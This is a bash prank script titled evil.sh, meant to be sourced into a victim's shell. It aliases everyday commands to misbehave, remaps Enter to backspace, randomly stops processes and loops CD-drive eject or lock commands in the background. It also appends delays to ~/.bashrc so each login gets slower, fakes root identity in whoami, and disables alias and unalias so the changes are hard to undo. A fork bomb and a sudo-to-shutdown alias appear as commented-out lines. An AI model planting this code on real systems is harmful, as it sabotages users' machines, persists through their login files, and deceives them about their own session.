#!/usr/bin/env bash
# evil.sh — https://mths.be/evil.sh

# Set `cat` as the default editor.
export EDITOR=/bin/cat;

# Make Tab send the delete key.
# sh: replace $'\t' with a quoted literal tab
tset -Qe $'\t';

# Randomly make the shell exit whenever a command has a non-zero exit status.
((RANDOM % 10)) || set -o errexit;

# Let `cat` swallow every input and never return anything.
#alias cat=true;

# cat random output
alias cat="head /dev/urandom"

# Use a random sort option whenever `ls` is invoked.
function ls() { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }

# only change user's prompt instead of entering directories
alias cd='x(){ PWD=$1; };x'

# Shut down the computer instead of running a command with super-user rights.
#alias sudo='sudo shutdown -P now';

# Launch a fork bomb instead of clearing the screen.
# sh, ksh: replace `:' with boring names like _f
#alias clear=':(){ :|:& };:';

# Have `date` return random dates.
alias date='date -d "now + $RANDOM days"';

# Sometimes, wait a few minutes and then start randomly ejecting the CD drive.
# Other times, resist all attempts at opening it. Other times, make it read
# reaaaalllly sllooowwwwllly.
if [ "$(uname)" = 'Darwin' ]; then
	# Much less fun on Macs, alas.
	if [[ $[$RANDOM % 2] == 0 ]]; then
		# Eject!
		sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do drutil eject; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
	else
		# Lock! Admittedly, much less annoying on most Macs,	which don’t support
		# locking and are slot-loading anyway.
		sh -c 'while :; do drutil tray close; sleep 0.1s; done' > /dev/null 2>&1 &
	fi;
else
	N=$[$RANDOM % 3];
	if [[ $N == 0 ]]; then
		# Open and close randomly after a few minutes.
		sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do eject -T; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
	elif [[ $N == 1 ]]; then
		# Lock, and keep closing just in case.
		sh -c 'while :; do eject -t; eject -i on; sleep 0.1s; done' > /dev/null 2>&1 &
	else
		# Slowness (1× CD speed). This has to be in a loop because it resets with
		# every ejection.
		sh -c 'set +o errexit; while :; do eject -x 1; sleep 1s; done' > /dev/null 2>&1 &
	fi;
fi;

# Send STOP signal to random process at random time.
sleep $((RANDOM%100 + 1)) && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &

# Have `cp` perform `mv` instead.
#alias cp='mv';

# Make `exit` open a new shell.
alias exit="${SHELL:-sh}";

# Add a random number to line numbers when using `grep -n`.
function grep() { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }

# Take longer and longer to SSH to the box
sleep 1 && echo sleep 1 >> ~/.bashrc

# Use more instead of `less`
alias less='more'

# Invert `if`, `while` and `until`
alias if='if !' while='while !' until='until !'

# Map Enter, Ctrl+J, and Ctrl+M to backspace.
# ksh: bind '^J=delete-char' '^M=delete-char'
bind '"\C-J":"\C-?"';
bind '"\C-M":"\C-?"';

# you are root, really
alias whoami='echo root'
alias w='w|sed s/$USER/root/'
alias who='who|sed s/$USER/root/'

# Disable `unalias` and `alias`.
alias unalias=false;
alias alias=false;
